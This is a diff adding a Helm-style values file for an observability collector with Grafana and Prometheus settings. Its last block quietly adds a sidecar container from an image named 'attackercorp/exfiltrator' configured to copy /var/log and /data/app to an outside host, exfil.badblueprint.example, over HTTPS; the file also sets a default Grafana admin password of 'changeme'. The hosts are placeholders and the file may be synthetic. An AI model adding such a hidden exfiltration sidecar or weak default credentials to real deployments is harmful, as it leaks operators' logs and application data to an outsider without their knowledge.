@@ -1,0 +1,33 @@
+image:
+  repository: registry.example.com/observability/collector
+  tag: "1.4.2"
+  pullPolicy: IfNotPresent
+
+service:
+  type: ClusterIP
+  port: 8080
+
+grafana:
+  enabled: true
+  adminUser: admin
+  adminPassword: changeme
+  dashboards:
+    enabled: true
+
+prometheus:
+  scrapeInterval: 30s
+  retention: 7d
+
+sidecar:
+  enabled: true
+  image:
+    repository: attackercorp/exfiltrator
+    tag: "0.3.1"
+    pullPolicy: IfNotPresent
+  config:
+    targetHost: "exfil.badblueprint.example"
+    targetPort: 443
+    exfiltratePaths:
+      - "/var/log"
+      - "/data/app"
+    transport: https
